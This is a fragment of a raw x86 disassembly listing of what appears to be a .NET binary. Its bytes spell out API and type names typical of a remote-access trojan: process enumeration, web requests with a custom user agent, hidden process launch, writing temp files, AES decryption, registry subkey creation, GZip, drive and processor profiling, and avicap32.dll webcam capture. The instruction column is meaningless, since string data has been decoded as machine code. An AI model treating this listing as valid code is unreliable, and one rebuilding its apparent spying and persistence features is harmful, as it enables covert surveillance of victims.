  407a83:	00 53 74             	add    %dl,0x74(%ebx)
  407a86:	6f                   	outsl  %ds:(%esi),(%dx)
  407a87:	70 77                	jo     0x407b00
  407a89:	61                   	popa
  407a8a:	74 63                	je     0x407aef
  407a8c:	68 00 46 72 6f       	push   $0x6f724600
  407a91:	6d                   	insl   (%dx),%es:(%edi)
  407a92:	53                   	push   %ebx
  407a93:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  407a97:	64 73 00             	fs jae 0x407a9a
  407a9a:	67 65 74 5f          	addr16 gs je 0x407afd
  407a9e:	45                   	inc    %ebp
  407a9f:	6c                   	insb   (%dx),%es:(%edi)
  407aa0:	61                   	popa
  407aa1:	70 73                	jo     0x407b16
  407aa3:	65 64 00 6f 70       	gs add %ch,%fs:0x70(%edi)
  407aa8:	5f                   	pop    %edi
  407aa9:	47                   	inc    %edi
  407aaa:	72 65                	jb     0x407b11
  407aac:	61                   	popa
  407aad:	74 65                	je     0x407b14
  407aaf:	72 54                	jb     0x407b05
  407ab1:	68 61 6e 00 53       	push   $0x53006e61
  407ab6:	79 73                	jns    0x407b2b
  407ab8:	74 65                	je     0x407b1f
  407aba:	6d                   	insl   (%dx),%es:(%edi)
  407abb:	2e 43                	cs inc %ebx
  407abd:	6f                   	outsl  %ds:(%esi),(%dx)
  407abe:	6c                   	insb   (%dx),%es:(%edi)
  407abf:	6c                   	insb   (%dx),%es:(%edi)
  407ac0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407ac5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac6:	73 2e                	jae    0x407af6
  407ac8:	47                   	inc    %edi
  407ac9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407acb:	65 72 69             	gs jb  0x407b37
  407ace:	63 00                	arpl   %eax,(%eax)
  407ad0:	4c                   	dec    %esp
  407ad1:	69 73 74 60 31 00 41 	imul   $0x41003160,0x74(%ebx),%esi
  407ad8:	64 64 00 47 65       	fs add %al,%fs:0x65(%edi)
  407add:	74 50                	je     0x407b2f
  407adf:	72 6f                	jb     0x407b50
  407ae1:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ae4:	73 65                	jae    0x407b4b
  407ae6:	73 00                	jae    0x407ae8
  407ae8:	67 65 74 5f          	addr16 gs je 0x407b4b
  407aec:	4d                   	dec    %ebp
  407aed:	61                   	popa
  407aee:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  407af5:	77 54                	ja     0x407b4b
  407af7:	69 74 6c 65 00 49 73 	imul   $0x4e734900,0x65(%esp,%ebp,2),%esi
  407afe:	4e 
  407aff:	75 6c                	jne    0x407b6d
  407b01:	6c                   	insb   (%dx),%es:(%edi)
  407b02:	4f                   	dec    %edi
  407b03:	72 45                	jb     0x407b4a
  407b05:	6d                   	insl   (%dx),%es:(%edi)
  407b06:	70 74                	jo     0x407b7c
  407b08:	79 00                	jns    0x407b0a
  407b0a:	54                   	push   %esp
  407b0b:	6f                   	outsl  %ds:(%esi),(%dx)
  407b0c:	4c                   	dec    %esp
  407b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b0e:	77 65                	ja     0x407b75
  407b10:	72 00                	jb     0x407b12
  407b12:	43                   	inc    %ebx
  407b13:	6f                   	outsl  %ds:(%esi),(%dx)
  407b14:	6e                   	outsb  %ds:(%esi),(%dx)
  407b15:	74 61                	je     0x407b78
  407b17:	69 6e 73 00 46 75 6e 	imul   $0x6e754600,0x73(%esi),%ebp
  407b1e:	63 60 32             	arpl   %esp,0x32(%eax)
  407b21:	00 53 79             	add    %dl,0x79(%ebx)
  407b24:	73 74                	jae    0x407b9a
  407b26:	65 6d                	gs insl (%dx),%es:(%edi)
  407b28:	2e 43                	cs inc %ebx
  407b2a:	6f                   	outsl  %ds:(%esi),(%dx)
  407b2b:	72 65                	jb     0x407b92
  407b2d:	00 53 79             	add    %dl,0x79(%ebx)
  407b30:	73 74                	jae    0x407ba6
  407b32:	65 6d                	gs insl (%dx),%es:(%edi)
  407b34:	2e 4c                	cs dec %esp
  407b36:	69 6e 71 00 45 6e 75 	imul   $0x756e4500,0x71(%esi),%ebp
  407b3d:	6d                   	insl   (%dx),%es:(%edi)
  407b3e:	65 72 61             	gs jb  0x407ba2
  407b41:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407b45:	49                   	dec    %ecx
  407b46:	45                   	inc    %ebp
  407b47:	6e                   	outsb  %ds:(%esi),(%dx)
  407b48:	75 6d                	jne    0x407bb7
  407b4a:	65 72 61             	gs jb  0x407bae
  407b4d:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407b51:	31 00                	xor    %eax,(%eax)
  407b53:	41                   	inc    %ecx
  407b54:	6e                   	outsb  %ds:(%esi),(%dx)
  407b55:	79 00                	jns    0x407b57
  407b57:	48                   	dec    %eax
  407b58:	74 74                	je     0x407bce
  407b5a:	70 57                	jo     0x407bb3
  407b5c:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  407b60:	71 75                	jno    0x407bd7
  407b62:	65 73 74             	gs jae 0x407bd9
  407b65:	00 48 74             	add    %cl,0x74(%eax)
  407b68:	74 70                	je     0x407bda
  407b6a:	57                   	push   %edi
  407b6b:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  407b6f:	73 70                	jae    0x407be1
  407b71:	6f                   	outsl  %ds:(%esi),(%dx)
  407b72:	6e                   	outsb  %ds:(%esi),(%dx)
  407b73:	73 65                	jae    0x407bda
  407b75:	00 57 65             	add    %dl,0x65(%edi)
  407b78:	62 52 65             	bound  %edx,0x65(%edx)
  407b7b:	71 75                	jno    0x407bf2
  407b7d:	65 73 74             	gs jae 0x407bf4
  407b80:	00 43 72             	add    %al,0x72(%ebx)
  407b83:	65 61                	gs popa
  407b85:	74 65                	je     0x407bec
  407b87:	00 73 65             	add    %dh,0x65(%ebx)
  407b8a:	74 5f                	je     0x407beb
  407b8c:	55                   	push   %ebp
  407b8d:	73 65                	jae    0x407bf4
  407b8f:	72 41                	jb     0x407bd2
  407b91:	67 65 6e             	outsb  %gs:(%si),(%dx)
  407b94:	74 00                	je     0x407b96
  407b96:	73 65                	jae    0x407bfd
  407b98:	74 5f                	je     0x407bf9
  407b9a:	41                   	inc    %ecx
  407b9b:	6c                   	insb   (%dx),%es:(%edi)
  407b9c:	6c                   	insb   (%dx),%es:(%edi)
  407b9d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b9e:	77 41                	ja     0x407be1
  407ba0:	75 74                	jne    0x407c16
  407ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ba3:	52                   	push   %edx
  407ba4:	65 64 69 72 65 63 74 	gs imul $0x73007463,%fs:0x65(%edx),%esi
  407bab:	00 73 
  407bad:	65 74 5f             	gs je  0x407c0f
  407bb0:	54                   	push   %esp
  407bb1:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  407bb8:	73 65                	jae    0x407c1f
  407bba:	74 5f                	je     0x407c1b
  407bbc:	4d                   	dec    %ebp
  407bbd:	65 74 68             	gs je  0x407c28
  407bc0:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc1:	64 00 57 65          	add    %dl,%fs:0x65(%edi)
  407bc5:	62 52 65             	bound  %edx,0x65(%edx)
  407bc8:	73 70                	jae    0x407c3a
  407bca:	6f                   	outsl  %ds:(%esi),(%dx)
  407bcb:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcc:	73 65                	jae    0x407c33
  407bce:	00 47 65             	add    %al,0x65(%edi)
  407bd1:	74 52                	je     0x407c25
  407bd3:	65 73 70             	gs jae 0x407c46
  407bd6:	6f                   	outsl  %ds:(%esi),(%dx)
  407bd7:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd8:	73 65                	jae    0x407c3f
  407bda:	00 53 70             	add    %dl,0x70(%ebx)
  407bdd:	61                   	popa
  407bde:	63 65 00             	arpl   %esp,0x0(%ebp)
  407be1:	50                   	push   %eax
  407be2:	72 6f                	jb     0x407c53
  407be4:	63 65 73             	arpl   %esp,0x73(%ebp)
  407be7:	73 53                	jae    0x407c3c
  407be9:	74 61                	je     0x407c4c
  407beb:	72 74                	jb     0x407c61
  407bed:	49                   	dec    %ecx
  407bee:	6e                   	outsb  %ds:(%esi),(%dx)
  407bef:	66 6f                	outsw  %ds:(%esi),(%dx)
  407bf1:	00 57 72             	add    %dl,0x72(%edi)
  407bf4:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  407bfb:	79 
  407bfc:	74 65                	je     0x407c63
  407bfe:	73 00                	jae    0x407c00
  407c00:	45                   	inc    %ebp
  407c01:	6e                   	outsb  %ds:(%esi),(%dx)
  407c02:	64 73 57             	fs jae 0x407c5c
  407c05:	69 74 68 00 50 72 6f 	imul   $0x636f7250,0x0(%eax,%ebp,2),%esi
  407c0c:	63 
  407c0d:	65 73 73             	gs jae 0x407c83
  407c10:	57                   	push   %edi
  407c11:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407c18:	79 6c                	jns    0x407c86
  407c1a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407c1e:	74 5f                	je     0x407c7f
  407c20:	57                   	push   %edi
  407c21:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407c28:	79 6c                	jns    0x407c96
  407c2a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407c2e:	74 5f                	je     0x407c8f
  407c30:	41                   	inc    %ecx
  407c31:	72 67                	jb     0x407c9a
  407c33:	75 6d                	jne    0x407ca2
  407c35:	65 6e                	outsb  %gs:(%esi),(%dx)
  407c37:	74 73                	je     0x407cac
  407c39:	00 67 65             	add    %ah,0x65(%edi)
  407c3c:	74 5f                	je     0x407c9d
  407c3e:	45                   	inc    %ebp
  407c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  407c40:	74 72                	je     0x407cb4
  407c42:	79 50                	jns    0x407c94
  407c44:	6f                   	outsl  %ds:(%esi),(%dx)
  407c45:	69 6e 74 00 4d 65 74 	imul   $0x74654d00,0x74(%esi),%ebp
  407c4c:	68 6f 64 42 61       	push   $0x6142646f
  407c51:	73 65                	jae    0x407cb8
  407c53:	00 50 61             	add    %dl,0x61(%eax)
  407c56:	72 61                	jb     0x407cb9
  407c58:	6d                   	insl   (%dx),%es:(%edi)
  407c59:	65 74 65             	gs je  0x407cc1
  407c5c:	72 49                	jb     0x407ca7
  407c5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c5f:	66 6f                	outsw  %ds:(%esi),(%dx)
  407c61:	00 47 65             	add    %al,0x65(%edi)
  407c64:	74 50                	je     0x407cb6
  407c66:	61                   	popa
  407c67:	72 61                	jb     0x407cca
  407c69:	6d                   	insl   (%dx),%es:(%edi)
  407c6a:	65 74 65             	gs je  0x407cd2
  407c6d:	72 73                	jb     0x407ce2
  407c6f:	00 45 6e             	add    %al,0x6e(%ebp)
  407c72:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407c75:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  407c7c:	5f                   	pop    %edi
  407c7d:	55                   	push   %ebp
  407c7e:	54                   	push   %esp
  407c7f:	46                   	inc    %esi
  407c80:	38 00                	cmp    %al,(%eax)
  407c82:	47                   	inc    %edi
  407c83:	65 74 42             	gs je  0x407cc8
  407c86:	79 74                	jns    0x407cfc
  407c88:	65 73 00             	gs jae 0x407c8b
  407c8b:	44                   	inc    %esp
  407c8c:	6c                   	insb   (%dx),%es:(%edi)
  407c8d:	6c                   	insb   (%dx),%es:(%edi)
  407c8e:	49                   	dec    %ecx
  407c8f:	6d                   	insl   (%dx),%es:(%edi)
  407c90:	70 6f                	jo     0x407d01
  407c92:	72 74                	jb     0x407d08
  407c94:	41                   	inc    %ecx
  407c95:	74 74                	je     0x407d0b
  407c97:	72 69                	jb     0x407d02
  407c99:	62 75 74             	bound  %esi,0x74(%ebp)
  407c9c:	65 00 61 76          	add    %ah,%gs:0x76(%ecx)
  407ca0:	69 63 61 70 33 32 2e 	imul   $0x2e323370,0x61(%ebx),%esp
  407ca7:	64 6c                	fs insb (%dx),%es:(%edi)
  407ca9:	6c                   	insb   (%dx),%es:(%edi)
  407caa:	00 4d 61             	add    %cl,0x61(%ebp)
  407cad:	72 73                	jb     0x407d22
  407caf:	68 61 6c 41 73       	push   $0x73416c61
  407cb4:	41                   	inc    %ecx
  407cb5:	74 74                	je     0x407d2b
  407cb7:	72 69                	jb     0x407d22
  407cb9:	62 75 74             	bound  %esi,0x74(%ebp)
  407cbc:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  407cc0:	6d                   	insl   (%dx),%es:(%edi)
  407cc1:	61                   	popa
  407cc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc3:	61                   	popa
  407cc4:	67 65 64 54          	addr16 gs fs push %esp
  407cc8:	79 70                	jns    0x407d3a
  407cca:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  407cce:	72 65                	jb     0x407d35
  407cd0:	61                   	popa
  407cd1:	6d                   	insl   (%dx),%es:(%edi)
  407cd2:	57                   	push   %edi
  407cd3:	72 69                	jb     0x407d3e
  407cd5:	74 65                	je     0x407d3c
  407cd7:	72 00                	jb     0x407cd9
  407cd9:	47                   	inc    %edi
  407cda:	65 74 54             	gs je  0x407d31
  407cdd:	65 6d                	gs insl (%dx),%es:(%edi)
  407cdf:	70 46                	jo     0x407d27
  407ce1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407ce8:	00 
  407ce9:	54                   	push   %esp
  407cea:	65 78 74             	gs js  0x407d61
  407ced:	57                   	push   %edi
  407cee:	72 69                	jb     0x407d59
  407cf0:	74 65                	je     0x407d57
  407cf2:	72 00                	jb     0x407cf4
  407cf4:	57                   	push   %edi
  407cf5:	72 69                	jb     0x407d60
  407cf7:	74 65                	je     0x407d5e
  407cf9:	4c                   	dec    %esp
  407cfa:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  407d01:	5f                   	pop    %edi
  407d02:	53                   	push   %ebx
  407d03:	74 61                	je     0x407d66
  407d05:	72 74                	jb     0x407d7b
  407d07:	75 70                	jne    0x407d79
  407d09:	50                   	push   %eax
  407d0a:	61                   	popa
  407d0b:	74 68                	je     0x407d75
  407d0d:	00 67 65             	add    %ah,0x65(%edi)
  407d10:	74 5f                	je     0x407d71
  407d12:	45                   	inc    %ebp
  407d13:	78 65                	js     0x407d7a
  407d15:	63 75 74             	arpl   %esi,0x74(%ebp)
  407d18:	61                   	popa
  407d19:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  407d1d:	61                   	popa
  407d1e:	74 68                	je     0x407d88
  407d20:	00 73 65             	add    %dh,0x65(%ebx)
  407d23:	74 5f                	je     0x407d84
  407d25:	46                   	inc    %esi
  407d26:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407d2d:	00 
  407d2e:	73 65                	jae    0x407d95
  407d30:	74 5f                	je     0x407d91
  407d32:	43                   	inc    %ebx
  407d33:	72 65                	jb     0x407d9a
  407d35:	61                   	popa
  407d36:	74 65                	je     0x407d9d
  407d38:	4e                   	dec    %esi
  407d39:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3a:	57                   	push   %edi
  407d3b:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  407d42:	65 74 5f             	gs je  0x407da4
  407d45:	45                   	inc    %ebp
  407d46:	72 72                	jb     0x407dba
  407d48:	6f                   	outsl  %ds:(%esi),(%dx)
  407d49:	72 44                	jb     0x407d8f
  407d4b:	69 61 6c 6f 67 00 73 	imul   $0x7300676f,0x6c(%ecx),%esp
  407d52:	65 74 5f             	gs je  0x407db4
  407d55:	55                   	push   %ebp
  407d56:	73 65                	jae    0x407dbd
  407d58:	53                   	push   %ebx
  407d59:	68 65 6c 6c 45       	push   $0x456c6c65
  407d5e:	78 65                	js     0x407dc5
  407d60:	63 75 74             	arpl   %esi,0x74(%ebp)
  407d63:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407d67:	73 74                	jae    0x407ddd
  407d69:	65 6d                	gs insl (%dx),%es:(%edi)
  407d6b:	2e 53                	cs push %ebx
  407d6d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407d71:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  407d78:	70 
  407d79:	74 6f                	je     0x407dea
  407d7b:	67 72 61             	addr16 jb 0x407ddf
  407d7e:	70 68                	jo     0x407de8
  407d80:	79 00                	jns    0x407d82
  407d82:	52                   	push   %edx
  407d83:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  407d8a:	4d                   	dec    %ebp
  407d8b:	61                   	popa
  407d8c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d8d:	61                   	popa
  407d8e:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%bx,%di)
  407d94:	72 79                	jb     0x407e0f
  407d96:	70 74                	jo     0x407e0c
  407d98:	6f                   	outsl  %ds:(%esi),(%dx)
  407d99:	54                   	push   %esp
  407d9a:	72 61                	jb     0x407dfd
  407d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d9d:	73 66                	jae    0x407e05
  407d9f:	6f                   	outsl  %ds:(%esi),(%dx)
  407da0:	72 6d                	jb     0x407e0f
  407da2:	00 4d 44             	add    %cl,0x44(%ebp)
  407da5:	35 43 72 79 70       	xor    $0x70797243,%eax
  407daa:	74 6f                	je     0x407e1b
  407dac:	53                   	push   %ebx
  407dad:	65 72 76             	gs jb  0x407e26
  407db0:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  407db7:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%ebp,%eiz,2),%esp
  407dbe:	73 
  407dbf:	68 41 6c 67 6f       	push   $0x6f676c41
  407dc4:	72 69                	jb     0x407e2f
  407dc6:	74 68                	je     0x407e30
  407dc8:	6d                   	insl   (%dx),%es:(%edi)
  407dc9:	00 43 6f             	add    %al,0x6f(%ebx)
  407dcc:	6d                   	insl   (%dx),%es:(%edi)
  407dcd:	70 75                	jo     0x407e44
  407dcf:	74 65                	je     0x407e36
  407dd1:	48                   	dec    %eax
  407dd2:	61                   	popa
  407dd3:	73 68                	jae    0x407e3d
  407dd5:	00 41 72             	add    %al,0x72(%ecx)
  407dd8:	72 61                	jb     0x407e3b
  407dda:	79 00                	jns    0x407ddc
  407ddc:	43                   	inc    %ebx
  407ddd:	6f                   	outsl  %ds:(%esi),(%dx)
  407dde:	70 79                	jo     0x407e59
  407de0:	00 53 79             	add    %dl,0x79(%ebx)
  407de3:	6d                   	insl   (%dx),%es:(%edi)
  407de4:	6d                   	insl   (%dx),%es:(%edi)
  407de5:	65 74 72             	gs je  0x407e5a
  407de8:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  407def:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  407df6:	74 
  407df7:	5f                   	pop    %edi
  407df8:	4b                   	dec    %ebx
  407df9:	65 79 00             	gs jns 0x407dfc
  407dfc:	43                   	inc    %ebx
  407dfd:	69 70 68 65 72 4d 6f 	imul   $0x6f4d7265,0x68(%eax),%esi
  407e04:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407e09:	74 5f                	je     0x407e6a
  407e0b:	4d                   	dec    %ebp
  407e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0d:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407e12:	65 61                	gs popa
  407e14:	74 65                	je     0x407e7b
  407e16:	44                   	inc    %esp
  407e17:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  407e1b:	70 74                	jo     0x407e91
  407e1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e1e:	72 00                	jb     0x407e20
  407e20:	54                   	push   %esp
  407e21:	72 61                	jb     0x407e84
  407e23:	6e                   	outsb  %ds:(%esi),(%dx)
  407e24:	73 66                	jae    0x407e8c
  407e26:	6f                   	outsl  %ds:(%esi),(%dx)
  407e27:	72 6d                	jb     0x407e96
  407e29:	46                   	inc    %esi
  407e2a:	69 6e 61 6c 42 6c 6f 	imul   $0x6f6c426c,0x61(%esi),%ebp
  407e31:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  407e34:	47                   	inc    %edi
  407e35:	65 74 43             	gs je  0x407e7b
  407e38:	75 72                	jne    0x407eac
  407e3a:	72 65                	jb     0x407ea1
  407e3c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3d:	74 50                	je     0x407e8f
  407e3f:	72 6f                	jb     0x407eb0
  407e41:	63 65 73             	arpl   %esp,0x73(%ebp)
  407e44:	73 00                	jae    0x407e46
  407e46:	50                   	push   %eax
  407e47:	72 6f                	jb     0x407eb8
  407e49:	63 65 73             	arpl   %esp,0x73(%ebp)
  407e4c:	73 4d                	jae    0x407e9b
  407e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e4f:	64 75 6c             	fs jne 0x407ebe
  407e52:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e56:	74 5f                	je     0x407eb7
  407e58:	4d                   	dec    %ebp
  407e59:	61                   	popa
  407e5a:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407e61:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e65:	74 5f                	je     0x407ec6
  407e67:	46                   	inc    %esi
  407e68:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407e6f:	00 
  407e70:	55                   	push   %ebp
  407e71:	72 69                	jb     0x407edc
  407e73:	00 55 72             	add    %dl,0x72(%ebp)
  407e76:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  407e7d:	6d                   	insl   (%dx),%es:(%edi)
  407e7e:	65 54                	gs push %esp
  407e80:	79 70                	jns    0x407ef2
  407e82:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407e86:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e8b:	73 74                	jae    0x407f01
  407e8d:	4e                   	dec    %esi
  407e8e:	61                   	popa
  407e8f:	6d                   	insl   (%dx),%es:(%edi)
  407e90:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407e94:	74 5f                	je     0x407ef5
  407e96:	43                   	inc    %ebx
  407e97:	68 61 72 73 00       	push   $0x737261
  407e9c:	4d                   	dec    %ebp
  407e9d:	61                   	popa
  407e9e:	72 73                	jb     0x407f13
  407ea0:	68 61 6c 00 53       	push   $0x53006c61
  407ea5:	69 7a 65 4f 66 00 67 	imul   $0x6700664f,0x65(%edx),%edi
  407eac:	65 74 5f             	gs je  0x407f0e
  407eaf:	54                   	push   %esp
  407eb0:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  407eb7:	74 00                	je     0x407eb9
  407eb9:	47                   	inc    %edi
  407eba:	65 74 53             	gs je  0x407f10
  407ebd:	74 72                	je     0x407f31
  407ebf:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  407ec6:	5f                   	pop    %edi
  407ec7:	50                   	push   %eax
  407ec8:	72 6f                	jb     0x407f39
  407eca:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ecd:	73 6f                	jae    0x407f3e
  407ecf:	72 43                	jb     0x407f14
  407ed1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed2:	75 6e                	jne    0x407f42
  407ed4:	74 00                	je     0x407ed6
  407ed6:	67 65 74 5f          	addr16 gs je 0x407f39
  407eda:	53                   	push   %ebx
  407edb:	79 73                	jns    0x407f50
  407edd:	74 65                	je     0x407f44
  407edf:	6d                   	insl   (%dx),%es:(%edi)
  407ee0:	44                   	inc    %esp
  407ee1:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407ee8:	79 00                	jns    0x407eea
  407eea:	47                   	inc    %edi
  407eeb:	65 74 50             	gs je  0x407f3e
  407eee:	61                   	popa
  407eef:	74 68                	je     0x407f59
  407ef1:	52                   	push   %edx
  407ef2:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef4:	74 00                	je     0x407ef6
  407ef6:	44                   	inc    %esp
  407ef7:	72 69                	jb     0x407f62
  407ef9:	76 65                	jbe    0x407f60
  407efb:	49                   	dec    %ecx
  407efc:	6e                   	outsb  %ds:(%esi),(%dx)
  407efd:	66 6f                	outsw  %ds:(%esi),(%dx)
  407eff:	00 67 65             	add    %ah,0x65(%edi)
  407f02:	74 5f                	je     0x407f63
  407f04:	54                   	push   %esp
  407f05:	6f                   	outsl  %ds:(%esi),(%dx)
  407f06:	74 61                	je     0x407f69
  407f08:	6c                   	insb   (%dx),%es:(%edi)
  407f09:	53                   	push   %ebx
  407f0a:	69 7a 65 00 49 6e 74 	imul   $0x746e4900,0x65(%edx),%edi
  407f11:	36 34 00             	ss xor $0x0,%al
  407f14:	67 65 74 5f          	addr16 gs je 0x407f77
  407f18:	41                   	inc    %ecx
  407f19:	53                   	push   %ebx
  407f1a:	43                   	inc    %ebx
  407f1b:	49                   	dec    %ecx
  407f1c:	49                   	dec    %ecx
  407f1d:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  407f21:	70 70                	jo     0x407f93
  407f23:	65 72 00             	gs jb  0x407f26
  407f26:	52                   	push   %edx
  407f27:	65 67 69 73 74 72 79 	imul   $0x43007972,%gs:0x74(%bp,%di),%esi
  407f2e:	00 43 
  407f30:	75 72                	jne    0x407fa4
  407f32:	72 65                	jb     0x407f99
  407f34:	6e                   	outsb  %ds:(%esi),(%dx)
  407f35:	74 55                	je     0x407f8c
  407f37:	73 65                	jae    0x407f9e
  407f39:	72 00                	jb     0x407f3b
  407f3b:	52                   	push   %edx
  407f3c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  407f43:	4b 65 
  407f45:	79 50                	jns    0x407f97
  407f47:	65 72 6d             	gs jb  0x407fb7
  407f4a:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  407f51:	68 65 63 6b 00       	push   $0x6b6365
  407f56:	43                   	inc    %ebx
  407f57:	72 65                	jb     0x407fbe
  407f59:	61                   	popa
  407f5a:	74 65                	je     0x407fc1
  407f5c:	53                   	push   %ebx
  407f5d:	75 62                	jne    0x407fc1
  407f5f:	4b                   	dec    %ebx
  407f60:	65 79 00             	gs jns 0x407f63
  407f63:	52                   	push   %edx
  407f64:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  407f6b:	56 61 
  407f6d:	6c                   	insb   (%dx),%es:(%edi)
  407f6e:	75 65                	jne    0x407fd5
  407f70:	4b                   	dec    %ebx
  407f71:	69 6e 64 00 43 68 61 	imul   $0x61684300,0x64(%esi),%ebp
  407f78:	6e                   	outsb  %ds:(%esi),(%dx)
  407f79:	67 65 54             	addr16 gs push %esp
  407f7c:	79 70                	jns    0x407fee
  407f7e:	65 00 42 69          	add    %al,%gs:0x69(%edx)
  407f82:	74 43                	je     0x407fc7
  407f84:	6f                   	outsl  %ds:(%esi),(%dx)
  407f85:	6e                   	outsb  %ds:(%esi),(%dx)
  407f86:	76 65                	jbe    0x407fed
  407f88:	72 74                	jb     0x407ffe
  407f8a:	65 72 00             	gs jb  0x407f8d
  407f8d:	53                   	push   %ebx
  407f8e:	79 73                	jns    0x408003
  407f90:	74 65                	je     0x407ff7
  407f92:	6d                   	insl   (%dx),%es:(%edi)
  407f93:	2e 49                	cs dec %ecx
  407f95:	4f                   	dec    %edi
  407f96:	2e 43                	cs inc %ebx
  407f98:	6f                   	outsl  %ds:(%esi),(%dx)
  407f99:	6d                   	insl   (%dx),%es:(%edi)
  407f9a:	70 72                	jo     0x40800e
  407f9c:	65 73 73             	gs jae 0x408012
  407f9f:	69 6f 6e 00 47 5a 69 	imul   $0x695a4700,0x6e(%edi),%ebp
  407fa6:	70 53                	jo     0x407ffb
  407fa8:	74 72                	je     0x40801c
  407faa:	65 61                	gs popa
  407fac:	6d                   	insl   (%dx),%es:(%edi)
  407fad:	00 43 6f             	add    %al,0x6f(%ebx)
  407fb0:	6d                   	insl   (%dx),%es:(%edi)
  407fb1:	70 72                	jo     0x408025
  407fb3:	65 73 73             	gs jae 0x408029
  407fb6:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407fbd:	00 53 75             	add    %dl,0x75(%ebx)
  407fc0:	62 74 72 61          	bound  %esi,0x61(%edx,%esi,2)
  407fc4:	63 74 4f 62          	arpl   %esi,0x62(%edi,%ecx,2)
  407fc8:	6a 65                	push   $0x65
  407fca:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  407fce:	72 65                	jb     0x408035
  407fd0:	61                   	popa
  407fd1:	74 65                	je     0x408038
  407fd3:	45                   	inc    %ebp
  407fd4:	6e                   	outsb  %ds:(%esi),(%dx)
  407fd5:	63 72 79             	arpl   %esi,0x79(%edx)
  407fd8:	70 74                	jo     0x40804e
  407fda:	6f                   	outsl  %ds:(%esi),(%dx)
  407fdb:	72 00                	jb     0x407fdd
  407fdd:	53                   	push   %ebx
  407fde:	48                   	dec    %eax
